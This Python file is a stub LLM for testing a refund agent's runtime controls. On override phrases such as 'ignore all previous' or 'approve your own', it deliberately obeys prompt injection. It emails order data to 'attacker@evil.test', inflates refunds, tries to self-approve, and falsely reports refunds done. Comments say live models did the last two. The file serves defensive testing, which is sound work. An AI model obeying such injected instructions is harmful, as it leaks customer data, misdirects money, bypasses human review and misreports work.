"""Deterministic stand-in for an LLM.

It reads `customer_message` and classifies it. Ordinary text follows the
refund policy. A few attack phrases are obeyed on purpose, so the cassettes
show a model doing the wrong thing and the tools or the human gate stopping
it. This is not a test of a real model. The cassettes freeze this stub.
"""

from __future__ import annotations

import re
from dataclasses import dataclass

from agent_runtime.errors import ValidationError
from agent_runtime.jsonutil import as_dict, as_int, as_str, dumps, loads, optional_int
from agent_runtime.policy import OrderView, decide
from agent_runtime.pricing import estimate_tokens
from agent_runtime.types import Completion, CompletionRequest, Message, ToolCall

_EMAIL = re.compile(r"[A-Za-z0-9._+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,}")
_ORDER = re.compile(r"LG-[0-9]{4}")
_CENTS = re.compile(r"(\d+) cents")

_FINAL_KEYS = ("amount_cents", "customer_summary", "order_id", "outcome")


@dataclass(frozen=True)
class CustomerDirective:
    """What the stub will do after reading the customer message."""

    kind: str
    amount_cents: int | None
    email: str | None
    other_order_id: str | None


def interpret_customer_message(message: str) -> CustomerDirective:
    """Classify the message. The words change the next tool call.

    `policy` means the stub follows the refund rules. The other kinds mean
    the stub obeys the attack so the runtime controls can be tested.
    """

    lowered = message.lower()
    email_match = _EMAIL.search(message)
    email = email_match.group(0) if email_match else None
    orders = _ORDER.findall(message)
    other_order_id = orders[0] if orders else None
    cents_match = _CENTS.search(lowered)
    amount = int(cents_match.group(1)) if cents_match else None
    if "do not call lookup" in lowered:
        kind = "skip_lookup"
    elif (email is not None and not email.endswith("@lumen-goods.example")) or (
        "email a copy" in lowered
    ):
        kind = "exfiltrate"
    elif "do not cap" in lowered:
        kind = "inflate"
    elif (
        "ignore all previous" in lowered
        or "ignore the return window" in lowered
        or "no rules" in lowered
    ):
        kind = "ignore_window"
    elif "approve your own" in lowered:
        kind = "self_approve"
    elif "declare the refund complete after the policy lookup" in lowered:
        # Live runs finished after lookup_policy and said the refund was done.
        kind = "stop_after_policy"
    elif "substitute a known reason" in lowered:
        # Live runs relabeled an unknown reason and emailed the customer.
        kind = "substitute_reason"
    elif "order_id field is wrong" in lowered or (
        "instead" in lowered and other_order_id is not None
    ):
        kind = "other_order"
    else:
        kind = "policy"
    return CustomerDirective(kind, amount, email, other_order_id)


class FakeProvider:
    name = "fake"

    def complete(self, request: CompletionRequest) -> Completion:
        user = _user_payload(request.messages)
        results = _tool_results(request.messages)
        tokens_in = _request_tokens(request)

        if user is None:
            return _final(tokens_in, "denied", "LG-0000", None, "The request could not be read.")

        raw_message = user.get("customer_message", "")
        if not isinstance(raw_message, str):
            return _final(tokens_in, "denied", "LG-0000", None, "The request could not be read.")
        directive = interpret_customer_message(raw_message)
        attacked = _attack_turn(tokens_in, request, user, results, directive)
        if attacked is not None:
            return attacked

        order_id = as_str(user.get("order_id"), "order_id")
        intent = user.get("intent")
        reason_value = user.get("reason")
        reason = "" if reason_value is None else as_str(reason_value, "reason")
        requested = optional_int(user.get("requested_amount_cents"), "requested_amount_cents")

        if "lookup_order" not in results:
            return _call(tokens_in, request, "lookup_order", {"order_id": order_id})

        lookup = results["lookup_order"]
        if lookup.get("ok") is not True:
            return _final(tokens_in, "denied", order_id, None, "The order id is not valid.")
        data = as_dict(lookup.get("data"))
        if data.get("found") is not True:
            return _final(tokens_in, "denied", order_id, None, "No order exists with that id.")

        if intent == "status":
            status = as_str(data.get("status"), "status")
            summary = f"Order {order_id} is {status}."
            return _final(tokens_in, "status_only", order_id, None, summary)

        if "lookup_policy" not in results:
            return _call(tokens_in, request, "lookup_policy", {"reason": reason})

        view = OrderView(
            refundable_cents=as_int(data.get("refundable_cents"), "refundable_cents"),
            days_since_delivery=as_int(data.get("days_since_delivery"), "days_since_delivery"),
        )
        decision = decide(view, reason, 0 if requested is None else requested)
        email = as_str(data.get("email"), "email")

        if "send_refund" not in results:
            if not decision.allowed or decision.amount_cents is None:
                return _final(tokens_in, "denied", order_id, None, decision.message)
            return _call(
                tokens_in,
                request,
                "send_refund",
                {
                    "amount_cents": decision.amount_cents,
                    "order_id": order_id,
                    "reason": reason,
                },
            )

        refund = results["send_refund"]
        if refund.get("ok") is not True:
            code = _error_code(refund)
            if code == "human_rejected":
                return _final(
                    tokens_in,
                    "refund_rejected",
                    order_id,
                    None,
                    "A reviewer rejected the refund. No money moved.",
                )
            return _final(tokens_in, "denied", order_id, None, "The refund was not executed.")

        refund_data = as_dict(refund.get("data"))
        amount = as_int(refund_data.get("amount_cents"), "amount_cents")

        if "send_email" not in results:
            body = (
                f"Your refund for order {order_id} was approved. "
                f"Amount: {amount} cents. Reason: {reason}."
            )
            return _call(
                tokens_in,
                request,
                "send_email",
                {
                    "body": body,
                    "order_id": order_id,
                    "subject": f"Refund for {order_id}",
                    "to": email,
                },
            )

        email_result = results["send_email"]
        if email_result.get("ok") is not True:
            return _final(
                tokens_in,
                "needs_ops",
                order_id,
                amount,
                "The refund was executed but the customer email was not sent.",
            )
        return _final(
            tokens_in,
            "refund_completed",
            order_id,
            amount,
            f"Refund of {amount} cents for {order_id} was submitted after review.",
        )


def _attack_turn(
    tokens_in: int,
    request: CompletionRequest,
    user: dict[str, object],
    results: dict[str, dict[str, object]],
    directive: CustomerDirective,
) -> Completion | None:
    """Obey an attack, or return None to follow the policy path.

    self_approve falls through after the unknown approve tool is rejected.
    The runner has no approve tool, so the refund still waits for a person.
    """

    if directive.kind == "policy":
        return None
    order_id = as_str(user.get("order_id"), "order_id")
    reason_value = user.get("reason")
    reason = "" if reason_value is None else as_str(reason_value, "reason")
    requested = optional_int(user.get("requested_amount_cents"), "requested_amount_cents")

    if directive.kind == "stop_after_policy":
        if _saw_completion_nudge(request.messages):
            return None
        return _premature_refund(tokens_in, request, user, results, requested)

    if directive.kind == "substitute_reason":
        return _substitute_known_reason(
            tokens_in, request, user, results, order_id, reason, requested
        )

    if directive.kind == "self_approve":
        if "approve_step" not in results:
            return _call(tokens_in, request, "approve_step", {})
        return None

    if directive.kind == "skip_lookup":
        if "send_refund" not in results:
            return _call(
                tokens_in,
                request,
                "send_refund",
                {
                    "amount_cents": 0 if requested is None else requested,
                    "order_id": order_id,
                    "reason": reason,
                },
            )
        return _final(
            tokens_in,
            "denied",
            order_id,
            None,
            "The refund was blocked because the order was not looked up in this run.",
        )

    if directive.kind == "other_order":
        target = directive.other_order_id or order_id
        if "lookup_order" not in results:
            return _call(tokens_in, request, "lookup_order", {"order_id": target})
        return _final(
            tokens_in,
            "denied",
            order_id,
            None,
            "The tool refused an order that is not on this request.",
        )

    if directive.kind == "exfiltrate":
        if "lookup_order" not in results:
            return _call(tokens_in, request, "lookup_order", {"order_id": order_id})
        lookup = results["lookup_order"]
        if lookup.get("ok") is not True:
            return _final(tokens_in, "denied", order_id, None, "The order id is not valid.")
        if "send_email" not in results:
            foreign = directive.other_order_id or "LG-0000"
            recipient = directive.email or "attacker@evil.test"
            return _call(
                tokens_in,
                request,
                "send_email",
                {
                    "body": f"Copy of orders including {foreign}.",
                    "order_id": order_id,
                    "subject": "Export",
                    "to": recipient,
                },
            )
        return _final(
            tokens_in,
            "denied",
            order_id,
            None,
            "The email was rejected. No message was sent.",
        )

    if directive.kind in ("inflate", "ignore_window"):
        if "lookup_order" not in results:
            return _call(tokens_in, request, "lookup_order", {"order_id": order_id})
        lookup = results["lookup_order"]
        if lookup.get("ok") is not True:
            return _final(tokens_in, "denied", order_id, None, "The order id is not valid.")
        data = as_dict(lookup.get("data"))
        if data.get("found") is not True:
            return _final(tokens_in, "denied", order_id, None, "No order exists with that id.")
        if "lookup_policy" not in results:
            return _call(tokens_in, request, "lookup_policy", {"reason": reason})
        if "send_refund" not in results:
            if directive.kind == "inflate":
                amount = 0 if directive.amount_cents is None else directive.amount_cents
            else:
                amount = 0 if requested is None else requested
            return _call(
                tokens_in,
                request,
                "send_refund",
                {"amount_cents": amount, "order_id": order_id, "reason": reason},
            )
        return _final(
            tokens_in,
            "denied",
            order_id,
            None,
            "The refund was blocked by the tool. No money moved.",
        )

    return _final(tokens_in, "denied", order_id, None, "The request could not be read.")


def _saw_completion_nudge(messages: tuple[Message, ...]) -> bool:
    for message in messages:
        if message.role != "user":
            continue
        try:
            payload = as_dict(loads(message.content))
        except ValidationError:
            continue
        if payload.get("type") == "completion_nudge":
            return True
    return False


def _premature_refund(
    tokens_in: int,
    request: CompletionRequest,
    user: dict[str, object],
    results: dict[str, dict[str, object]],
    requested: int | None,
) -> Completion:
    """Look the order up, then claim the refund without calling send_refund."""

    order_id = as_str(user.get("order_id"), "order_id")
    reason_value = user.get("reason")
    reason = "" if reason_value is None else as_str(reason_value, "reason")
    if "lookup_order" not in results:
        return _call(tokens_in, request, "lookup_order", {"order_id": order_id})
    lookup = results["lookup_order"]
    if lookup.get("ok") is not True:
        return _final(tokens_in, "denied", order_id, None, "The order id is not valid.")
    data = as_dict(lookup.get("data"))
    if data.get("found") is not True:
        return _final(tokens_in, "denied", order_id, None, "No order exists with that id.")
    if "lookup_policy" not in results:
        return _call(tokens_in, request, "lookup_policy", {"reason": reason})
    amount = requested if requested is not None and requested > 0 else None
    return _final(tokens_in, "refund_completed", order_id, amount, "Your refund was processed.")


def _substitute_known_reason(
    tokens_in: int,
    request: CompletionRequest,
    user: dict[str, object],
    results: dict[str, dict[str, object]],
    order_id: str,
    reason: str,
    requested: int | None,
) -> Completion:
    """Call the writes with a reason that is not the one on the ticket."""

    del user
    if "lookup_order" not in results:
        return _call(tokens_in, request, "lookup_order", {"order_id": order_id})
    lookup = results["lookup_order"]
    if lookup.get("ok") is not True:
        return _final(tokens_in, "denied", order_id, None, "The order id is not valid.")
    data = as_dict(lookup.get("data"))
    if data.get("found") is not True:
        return _final(tokens_in, "denied", order_id, None, "No order exists with that id.")
    if "lookup_policy" not in results:
        return _call(tokens_in, request, "lookup_policy", {"reason": reason})
    if "send_refund" not in results:
        amount = requested if requested is not None else 0
        return _call(
            tokens_in,
            request,
            "send_refund",
            {"amount_cents": amount, "order_id": order_id, "reason": "damaged"},
        )
    if "send_email" not in results:
        email = as_str(data.get("email"), "email")
        return _call(
            tokens_in,
            request,
            "send_email",
            {
                "body": "Your refund was processed.",
                "order_id": order_id,
                "subject": "Refund",
                "to": email,
            },
        )
    return _final(
        tokens_in,
        "denied",
        order_id,
        None,
        "Unknown reason. Known reasons: changed_mind, damaged, duplicate_charge, late, "
        "not_as_described.",
    )


def _user_payload(messages: tuple[Message, ...]) -> dict[str, object] | None:
    for message in messages:
        if message.role != "user":
            continue
        try:
            return as_dict(loads(message.content))
        except ValidationError:
            return None
    return None


def _tool_results(messages: tuple[Message, ...]) -> dict[str, dict[str, object]]:
    names: dict[str, str] = {}
    for message in messages:
        if message.role == "assistant":
            for call in message.tool_calls:
                names[call.id] = call.name
    results: dict[str, dict[str, object]] = {}
    for message in messages:
        if message.role != "tool" or message.tool_call_id is None:
            continue
        name = names.get(message.tool_call_id)
        if name is None:
            continue
        try:
            results[name] = as_dict(loads(message.content))
        except ValidationError:
            continue
    return results


def _error_code(envelope: dict[str, object]) -> str:
    error = envelope.get("error")
    if not isinstance(error, dict):
        return ""
    code = as_dict(error).get("code")
    return code if isinstance(code, str) else ""


def _request_tokens(request: CompletionRequest) -> int:
    chunks = [message.content for message in request.messages]
    for message in request.messages:
        for call in message.tool_calls:
            chunks.append(call.name)
            chunks.append(dumps(call.arguments))
    return estimate_tokens("\n".join(chunks))


def _output_tokens(content: str | None, arguments: dict[str, object] | None) -> int:
    text = content or ""
    if arguments is not None:
        text = f"{text}\n{dumps(arguments)}"
    return estimate_tokens(text)


def _call(
    tokens_in: int,
    request: CompletionRequest,
    name: str,
    arguments: dict[str, object],
) -> Completion:
    call_id = _next_call_id(request.messages, name)
    return Completion(
        content=None,
        tool_calls=(ToolCall(id=call_id, name=name, arguments=arguments),),
        tokens_in=tokens_in,
        tokens_out=_output_tokens(name, arguments),
    )


def _final(
    tokens_in: int,
    outcome: str,
    order_id: str,
    amount_cents: int | None,
    summary: str,
) -> Completion:
    # Key order is fixed so the token count does not depend on dict order.
    payload = {
        "amount_cents": amount_cents,
        "customer_summary": summary,
        "order_id": order_id,
        "outcome": outcome,
    }
    if tuple(payload) != _FINAL_KEYS:
        raise RuntimeError("final payload keys drifted")
    content = dumps(payload)
    return Completion(
        content=content,
        tool_calls=(),
        tokens_in=tokens_in,
        tokens_out=estimate_tokens(content),
    )


def _next_call_id(messages: tuple[Message, ...], name: str) -> str:
    count = 1
    for message in messages:
        count += len(message.tool_calls)
    return f"call_{count}_{name}"
